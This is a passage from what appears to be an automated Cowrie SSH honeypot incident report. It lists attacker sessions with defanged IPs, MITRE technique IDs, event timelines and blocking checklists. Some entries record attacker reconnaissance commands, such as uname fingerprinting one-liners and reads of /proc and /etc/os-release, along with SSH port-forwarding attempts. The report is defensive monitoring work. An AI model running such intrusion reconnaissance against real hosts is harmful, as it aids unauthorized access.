| `2026-08-30 13:02:01` | `cowrie.log.closed` |
| `2026-08-30 13:02:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-475c40c7b86a

| Field | Detail |
|---|---|
| **Source IP** | `182.95.186[.]182` |
| **First Seen** | 2026-08-30 13:02 |
| **Last Seen** | 2026-08-30 13:02 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:02:36` | `cowrie.session.connect` |
| `2026-08-30 13:02:37` | `cowrie.client.version` |
| `2026-08-30 13:02:37` | `cowrie.client.kex` |
| `2026-08-30 13:02:41` | `cowrie.login.success` |
| `2026-08-30 13:02:42` | `cowrie.direct-tcpip.request` |
| `2026-08-30 13:02:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.95.186[.]182` to AbuseIPDB if not already reported
- [ ] Block `182.95.186[.]182` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a1032e97ea0

| Field | Detail |
|---|---|
| **Source IP** | `217.100.184[.]50` |
| **First Seen** | 2026-08-30 13:02 |
| **Last Seen** | 2026-08-30 13:02 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:02:48` | `cowrie.session.connect` |
| `2026-08-30 13:02:48` | `cowrie.client.version` |
| `2026-08-30 13:02:48` | `cowrie.client.kex` |
| `2026-08-30 13:02:49` | `cowrie.login.success` |
| `2026-08-30 13:02:49` | `cowrie.direct-tcpip.request` |
| `2026-08-30 13:02:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.100.184[.]50` to AbuseIPDB if not already reported
- [ ] Block `217.100.184[.]50` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e50596a72ae1

| Field | Detail |
|---|---|
| **Source IP** | `71.229.1[.]186` |
| **First Seen** | 2026-08-30 13:02 |
| **Last Seen** | 2026-08-30 13:02 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:02:52` | `cowrie.session.connect` |
| `2026-08-30 13:02:52` | `cowrie.client.version` |
| `2026-08-30 13:02:52` | `cowrie.client.kex` |
| `2026-08-30 13:02:53` | `cowrie.login.success` |
| `2026-08-30 13:02:54` | `cowrie.direct-tcpip.request` |
| `2026-08-30 13:02:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `71.229.1[.]186` to AbuseIPDB if not already reported
- [ ] Block `71.229.1[.]186` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81a87eef3ab8

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]53` |
| **First Seen** | 2026-08-30 13:03 |
| **Last Seen** | 2026-08-30 13:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:03:51` | `cowrie.session.connect` |
| `2026-08-30 13:03:51` | `cowrie.client.version` |
| `2026-08-30 13:03:51` | `cowrie.client.kex` |
| `2026-08-30 13:03:51` | `cowrie.login.success` |
| `2026-08-30 13:03:52` | `cowrie.session.params` |
| `2026-08-30 13:03:52` | `cowrie.command.input` |
| `2026-08-30 13:03:52` | `cowrie.log.closed` |
| `2026-08-30 13:03:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]53` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d04610eb710c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-30 13:03 |
| **Last Seen** | 2026-08-30 13:03 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:03:52` | `cowrie.session.connect` |
| `2026-08-30 13:03:52` | `cowrie.client.version` |
| `2026-08-30 13:03:52` | `cowrie.client.kex` |
| `2026-08-30 13:03:53` | `cowrie.login.success` |
| `2026-08-30 13:03:54` | `cowrie.session.params` |
| `2026-08-30 13:03:54` | `cowrie.command.input` |
| `2026-08-30 13:03:54` | `cowrie.command.input` |
| `2026-08-30 13:03:54` | `cowrie.command.input` |
| `2026-08-30 13:03:54` | `cowrie.command.input` |
| `2026-08-30 13:03:54` | `cowrie.command.input` |
| `2026-08-30 13:03:54` | `cowrie.command.success` |
| `2026-08-30 13:03:54` | `cowrie.command.input` |
| `2026-08-30 13:03:54` | `cowrie.command.input` |
| `2026-08-30 13:03:54` | `cowrie.command.input` |
| `2026-08-30 13:03:54` | `cowrie.command.input` |
| `2026-08-30 13:03:54` | `cowrie.log.closed` |
| `2026-08-30 13:03:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2fd69ff80aca

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-30 13:05 |
| **Last Seen** | 2026-08-30 13:05 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:05:52` | `cowrie.session.connect` |
| `2026-08-30 13:05:52` | `cowrie.client.version` |
| `2026-08-30 13:05:52` | `cowrie.client.kex` |
| `2026-08-30 13:05:53` | `cowrie.login.success` |
| `2026-08-30 13:05:54` | `cowrie.session.params` |
| `2026-08-30 13:05:54` | `cowrie.command.input` |
| `2026-08-30 13:05:54` | `cowrie.command.input` |
| `2026-08-30 13:05:54` | `cowrie.command.input` |
| `2026-08-30 13:05:54` | `cowrie.command.input` |
| `2026-08-30 13:05:54` | `cowrie.command.input` |
| `2026-08-30 13:05:54` | `cowrie.command.success` |
| `2026-08-30 13:05:54` | `cowrie.command.input` |
| `2026-08-30 13:05:54` | `cowrie.command.input` |
| `2026-08-30 13:05:54` | `cowrie.command.input` |
| `2026-08-30 13:05:54` | `cowrie.command.input` |
| `2026-08-30 13:05:54` | `cowrie.log.closed` |
| `2026-08-30 13:05:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-797e3bf4070e

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-30 13:05 |
| **Last Seen** | 2026-08-30 13:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:05:54` | `cowrie.session.connect` |
| `2026-08-30 13:05:54` | `cowrie.client.version` |
| `2026-08-30 13:05:54` | `cowrie.client.kex` |
| `2026-08-30 13:05:55` | `cowrie.login.success` |
| `2026-08-30 13:05:55` | `cowrie.direct-tcpip.request` |
| `2026-08-30 13:05:56` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-30 13:05:56` | `cowrie.direct-tcpip.data` |
| `2026-08-30 13:05:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b1bf00f437b

| Field | Detail |
|---|---|
| **Source IP** | `49.205.214[.]47` |
| **First Seen** | 2026-08-30 13:06 |
| **Last Seen** | 2026-08-30 13:06 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:06:09` | `cowrie.session.connect` |
| `2026-08-30 13:06:10` | `cowrie.client.version` |
| `2026-08-30 13:06:10` | `cowrie.client.kex` |
| `2026-08-30 13:06:11` | `cowrie.login.success` |
| `2026-08-30 13:06:12` | `cowrie.direct-tcpip.request` |
| `2026-08-30 13:06:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.205.214[.]47` to AbuseIPDB if not already reported
- [ ] Block `49.205.214[.]47` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9545a7640ba9

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]53` |
| **First Seen** | 2026-08-30 13:06 |
| **Last Seen** | 2026-08-30 13:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:06:17` | `cowrie.session.connect` |
| `2026-08-30 13:06:17` | `cowrie.client.version` |
| `2026-08-30 13:06:17` | `cowrie.client.kex` |
| `2026-08-30 13:06:17` | `cowrie.login.success` |
| `2026-08-30 13:06:18` | `cowrie.session.params` |
| `2026-08-30 13:06:18` | `cowrie.command.input` |
| `2026-08-30 13:06:18` | `cowrie.log.closed` |
| `2026-08-30 13:06:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]53` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4024ada24e7e

| Field | Detail |
|---|---|
| **Source IP** | `20.193.153[.]215` |
| **First Seen** | 2026-08-30 13:07 |
| **Last Seen** | 2026-08-30 13:07 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `grep -c ^processor /proc/cpuinfo` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:07:27` | `cowrie.session.connect` |
| `2026-08-30 13:07:27` | `cowrie.client.version` |
| `2026-08-30 13:07:28` | `cowrie.client.kex` |
| `2026-08-30 13:07:28` | `cowrie.login.success` |
| `2026-08-30 13:07:30` | `cowrie.session.params` |
| `2026-08-30 13:07:30` | `cowrie.command.input` |
| `2026-08-30 13:07:30` | `cowrie.log.closed` |
| `2026-08-30 13:07:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.193.153[.]215` to AbuseIPDB if not already reported
- [ ] Block `20.193.153[.]215` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52cca0326192

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-30 13:07 |
| **Last Seen** | 2026-08-30 13:07 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:07:36` | `cowrie.session.connect` |
| `2026-08-30 13:07:36` | `cowrie.client.version` |
| `2026-08-30 13:07:36` | `cowrie.client.kex` |
| `2026-08-30 13:07:38` | `cowrie.login.success` |
| `2026-08-30 13:07:39` | `cowrie.session.params` |
| `2026-08-30 13:07:39` | `cowrie.command.input` |
| `2026-08-30 13:07:39` | `cowrie.command.input` |
| `2026-08-30 13:07:39` | `cowrie.command.input` |
| `2026-08-30 13:07:39` | `cowrie.command.input` |
| `2026-08-30 13:07:39` | `cowrie.command.input` |
| `2026-08-30 13:07:39` | `cowrie.command.success` |
| `2026-08-30 13:07:39` | `cowrie.command.input` |
| `2026-08-30 13:07:39` | `cowrie.command.input` |
| `2026-08-30 13:07:39` | `cowrie.command.input` |
| `2026-08-30 13:07:39` | `cowrie.command.input` |
| `2026-08-30 13:07:40` | `cowrie.log.closed` |
| `2026-08-30 13:07:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a89c5620fd9

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]53` |
| **First Seen** | 2026-08-30 13:08 |
| **Last Seen** | 2026-08-30 13:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:08:42` | `cowrie.session.connect` |
| `2026-08-30 13:08:42` | `cowrie.client.version` |
| `2026-08-30 13:08:42` | `cowrie.client.kex` |
| `2026-08-30 13:08:42` | `cowrie.login.success` |
| `2026-08-30 13:08:43` | `cowrie.session.params` |
| `2026-08-30 13:08:43` | `cowrie.command.input` |
| `2026-08-30 13:08:43` | `cowrie.log.closed` |
| `2026-08-30 13:08:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]53` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-edc6cbf0125f

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-30 13:09 |
| **Last Seen** | 2026-08-30 13:09 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:09:15` | `cowrie.session.connect` |
| `2026-08-30 13:09:15` | `cowrie.client.version` |
| `2026-08-30 13:09:15` | `cowrie.client.kex` |
| `2026-08-30 13:09:17` | `cowrie.login.success` |
| `2026-08-30 13:09:18` | `cowrie.session.params` |
| `2026-08-30 13:09:18` | `cowrie.command.input` |
| `2026-08-30 13:09:18` | `cowrie.command.input` |
| `2026-08-30 13:09:18` | `cowrie.command.input` |
| `2026-08-30 13:09:18` | `cowrie.command.input` |
| `2026-08-30 13:09:18` | `cowrie.command.input` |
| `2026-08-30 13:09:18` | `cowrie.command.success` |
| `2026-08-30 13:09:18` | `cowrie.command.input` |
| `2026-08-30 13:09:18` | `cowrie.command.input` |
| `2026-08-30 13:09:18` | `cowrie.command.input` |
| `2026-08-30 13:09:18` | `cowrie.command.input` |
| `2026-08-30 13:09:19` | `cowrie.log.closed` |
| `2026-08-30 13:09:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0927836c97b

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-30 13:09 |
| **Last Seen** | 2026-08-30 13:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:09:41` | `cowrie.session.connect` |
| `2026-08-30 13:09:41` | `cowrie.client.version` |
| `2026-08-30 13:09:41` | `cowrie.client.kex` |
| `2026-08-30 13:09:42` | `cowrie.login.success` |
| `2026-08-30 13:09:42` | `cowrie.direct-tcpip.request` |
| `2026-08-30 13:09:42` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-30 13:09:42` | `cowrie.direct-tcpip.data` |
| `2026-08-30 13:09:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05fb0523b438

| Field | Detail |
|---|---|
| **Source IP** | `211.53.58[.]10` |
| **First Seen** | 2026-08-30 13:10 |
| **Last Seen** | 2026-08-30 13:10 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:10:40` | `cowrie.session.connect` |
| `2026-08-30 13:10:41` | `cowrie.client.version` |
| `2026-08-30 13:10:41` | `cowrie.client.kex` |
| `2026-08-30 13:10:44` | `cowrie.login.success` |
| `2026-08-30 13:10:45` | `cowrie.direct-tcpip.request` |
| `2026-08-30 13:10:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.53.58[.]10` to AbuseIPDB if not already reported
- [ ] Block `211.53.58[.]10` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d62513c81b77

| Field | Detail |
|---|---|
| **Source IP** | `220.116.113[.]35` |
| **First Seen** | 2026-08-30 13:10 |
| **Last Seen** | 2026-08-30 13:10 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:10:50` | `cowrie.session.connect` |
| `2026-08-30 13:10:51` | `cowrie.client.version` |
| `2026-08-30 13:10:51` | `cowrie.client.kex` |
| `2026-08-30 13:10:53` | `cowrie.login.success` |
| `2026-08-30 13:10:54` | `cowrie.direct-tcpip.request` |
| `2026-08-30 13:10:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.116.113[.]35` to AbuseIPDB if not already reported
- [ ] Block `220.116.113[.]35` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-efaa5eaf7363

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-30 13:11 |
| **Last Seen** | 2026-08-30 13:11 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:11:00` | `cowrie.session.connect` |
| `2026-08-30 13:11:00` | `cowrie.client.version` |
| `2026-08-30 13:11:00` | `cowrie.client.kex` |
| `2026-08-30 13:11:01` | `cowrie.login.success` |
| `2026-08-30 13:11:03` | `cowrie.session.params` |
| `2026-08-30 13:11:03` | `cowrie.command.input` |
| `2026-08-30 13:11:03` | `cowrie.command.input` |
| `2026-08-30 13:11:03` | `cowrie.command.input` |
| `2026-08-30 13:11:03` | `cowrie.command.input` |
| `2026-08-30 13:11:03` | `cowrie.command.input` |
| `2026-08-30 13:11:03` | `cowrie.command.success` |
| `2026-08-30 13:11:03` | `cowrie.command.input` |
| `2026-08-30 13:11:03` | `cowrie.command.input` |
| `2026-08-30 13:11:03` | `cowrie.command.input` |
| `2026-08-30 13:11:03` | `cowrie.command.input` |
| `2026-08-30 13:11:03` | `cowrie.log.closed` |
| `2026-08-30 13:11:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf20000968d4

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]53` |
| **First Seen** | 2026-08-30 13:11 |
| **Last Seen** | 2026-08-30 13:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:11:05` | `cowrie.session.connect` |
| `2026-08-30 13:11:05` | `cowrie.client.version` |
| `2026-08-30 13:11:05` | `cowrie.client.kex` |
| `2026-08-30 13:11:05` | `cowrie.login.success` |
| `2026-08-30 13:11:06` | `cowrie.session.params` |
| `2026-08-30 13:11:06` | `cowrie.command.input` |
| `2026-08-30 13:11:06` | `cowrie.log.closed` |
| `2026-08-30 13:11:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]53` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2ca6b8321ac

| Field | Detail |
|---|---|
| **Source IP** | `150.136.176[.]163` |
| **First Seen** | 2026-08-30 13:11 |
| **Last Seen** | 2026-08-30 13:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:11:59` | `cowrie.session.connect` |
| `2026-08-30 13:11:59` | `cowrie.client.version` |
| `2026-08-30 13:11:59` | `cowrie.client.kex` |
| `2026-08-30 13:11:59` | `cowrie.login.success` |
| `2026-08-30 13:12:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `150.136.176[.]163` to AbuseIPDB if not already reported
- [ ] Block `150.136.176[.]163` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f17935115191

| Field | Detail |
|---|---|
| **Source IP** | `150.136.176[.]163` |
| **First Seen** | 2026-08-30 13:12 |
| **Last Seen** | 2026-08-30 13:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:12:00` | `cowrie.session.connect` |
| `2026-08-30 13:12:00` | `cowrie.client.version` |
| `2026-08-30 13:12:00` | `cowrie.client.kex` |
| `2026-08-30 13:12:00` | `cowrie.login.success` |
| `2026-08-30 13:12:00` | `cowrie.session.closed` |

**Recommended Actions:**
